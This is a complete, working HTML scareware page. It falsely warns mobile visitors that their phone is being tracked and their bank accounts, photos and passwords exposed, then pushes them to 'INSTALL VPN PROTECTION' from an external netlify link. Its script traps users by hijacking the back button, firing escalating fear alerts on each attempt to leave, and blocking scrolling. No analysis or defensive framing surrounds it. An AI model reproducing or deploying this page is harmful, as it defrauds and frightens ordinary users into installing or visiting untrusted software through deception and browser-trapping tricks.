<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Security Alert</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #000;
            color: white;
            height: 100vh;
            overflow: hidden;
            touch-action: manipulation;
            position: fixed;
            width: 100%;
            user-select: none;
            -webkit-user-select: none;
        }
        
        .alert-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            /* Increased padding to create more black space around the alert box */
            padding: 50px 20px; /* Top/Bottom 50px, Left/Right 20px */
        }
        
        .alert-box {
            background: linear-gradient(135deg, #d10000 0%, #8b0000 100%);
            border: 3px solid #ff0000;
            border-radius: 15px; /* Maintains the edge curve square shape */
            /* Adjusted internal padding for content within the red box */
            padding: 30px 25px; /* Top/Bottom 30px, Left/Right 25px */
            width: 100%; /* Will take available width within container's padding */
            /* Key: Max width set to fit perfectly within a 420px screen
               (420px screen - 20px left padding - 20px right padding = 380px) */
            max-width: 380px; 
            text-align: center;
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0% { box-shadow: 0 0 15px rgba(255, 0, 0, 0.7); }
            50% { box-shadow: 0 0 30px rgba(255, 0, 0, 0.9); }
            100% { box-shadow: 0 0 15px rgba(255, 0, 0, 0.7); }
        }
        
        .alert-icon {
            /* Reduced icon size */
            width: 50px;
            height: 50px;
            margin-bottom: 15px;
        }
        
        h1 {
            /* Reduced font size for heading */
            font-size: 20px; 
            margin-bottom: 15px;
            color: #fff;
            text-shadow: 0 2px 5px rgba(0,0,0,0.3);
        }
        
        p {
            margin-bottom: 20px;
            /* Reduced font size for paragraphs */
            font-size: 15px; 
            line-height: 1.5;
        }
        
        .btn-group {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        
        .btn {
            /* Reduced button padding and font size */
            padding: 12px; 
            border: none;
            border-radius: 8px;
            font-weight: bold;
            font-size: 16px; 
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .btn-install {
            background: linear-gradient(to right, #00c853, #00e676);
            color: white;
            box-shadow: 0 4px 0 #009624;
        }
        
        .btn-install:active {
            transform: translateY(2px);
            box-shadow: 0 2px 0 #009624;
        }
        
        .btn-cancel {
            background: #333;
            color: #ccc;
        }
        
        .btn-cancel:active {
            background: #444;
        }
        
        .exit-attempts {
            margin-top: 15px;
            font-size: 14px;
            color: #ff9999;
        }
        
        /* Disable zooming and text selection */
        body {
            user-select: none;
            -webkit-user-select: none;
            touch-action: pan-y;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20% { transform: translateX(-10px); }
            40% { transform: translateX(10px); }
            60% { transform: translateX(-10px); }
            80% { transform: translateX(10px); }
        }

        /* Media Queries for further adjustments on smaller/larger screens */
        @media (max-width: 420px) {
            /* If the actual device width is less than 420px, apply these */
            .alert-container {
                padding: 30px 10px; /* Reduce padding to avoid too much white space */
            }
            .alert-box {
                padding: 25px 20px; /* Adjust internal padding */
            }
            h1 {
                font-size: 18px;
            }
            p {
                font-size: 14px;
            }
            .btn {
                padding: 10px;
                font-size: 15px;
            }
        }

        @media (max-height: 600px) and (orientation: landscape) {
            .alert-box {
                padding: 20px 15px;
                max-width: 90%; /* Allow it to take up more width on shorter landscape screens */
            }
            .alert-icon {
                width: 40px;
                height: 40px;
                margin-bottom: 10px;
            }
            h1 {
                font-size: 17px;
            }
            p {
                font-size: 13px;
                margin-bottom: 15px;
            }
            .btn {
                padding: 8px;
                font-size: 13px;
            }
            .exit-attempts {
                margin-top: 10px;
                font-size: 11px;
            }
        }
    </style>
</head>
<body>
    <div class="alert-container" id="alertContainer">
        <div class="alert-box">
            <img src="https://cdn-icons-png.flaticon.com/512/753/753345.png" class="alert-icon" alt="Warning">
            <h1> EMERGENCY SECURITY ALERT ‚ö†Ô∏è</h1>
            <p><strong>YOUR PHONE IS BEING TRACKED!</strong></p>
            <p>Scammers have changed your device location and can access your:</p>
            <p>‚Ä¢ Bank accounts<br>‚Ä¢ Photos<br>‚Ä¢ Passwords</p>
            <div class="btn-group">
                <button class="btn btn-install" onclick="window.location.href='https://antivirus-browser.netlify.app/'">
                    üîí INSTALL VPN PROTECTION NOW
                </button>
                <button class="btn btn-cancel" id="cancelBtn">
                    CANCEL (RISKY)
                </button>
            </div>
            <div class="exit-attempts" id="exitAttempts">
                Warning: 0/7 attempts
            </div>
        </div>
    </div>

    <script>
        let attempts = 0;
        const maxAttempts = 7;
        const cancelBtn = document.getElementById('cancelBtn');
        const exitAttemptsText = document.getElementById('exitAttempts');
        
        // Disable back button
        history.pushState(null, null, location.href);
        window.onpopstate = function(event) {
            history.go(1);
            handleExitAttempt();
        };
        
        // Handle exit attempts
        function handleExitAttempt() {
            attempts++;
            exitAttemptsText.textContent = `Warning: ${attempts}/${maxAttempts} attempts to exit`;
            
            if (attempts < maxAttempts) {
                const warnings = [
                    "Your data is still at risk!",
                    "Scammers are accessing your photos!",
                    "Bank accounts is visible!",
                    "Last chance to protect yourself!",
                    "Security breach detected!",
                    "Critical danger!",
                    "Final warning!"
                ];
                
                alert(`‚ö†Ô∏è ${warnings[attempts-1]}`);
                
                const alertBox = document.querySelector('.alert-box');
                alertBox.style.animation = 'none';
                alertBox.offsetHeight; 
                alertBox.style.animation = 'shake 0.5s, pulse 1.5s infinite';
            } else {
                window.location.href = "about:blank";
            }
        }
        
        cancelBtn.addEventListener('click', handleExitAttempt);
        
        document.addEventListener('touchmove', function(e) {
            e.preventDefault();
        }, { passive: false });
    </script>
</body>
</html>
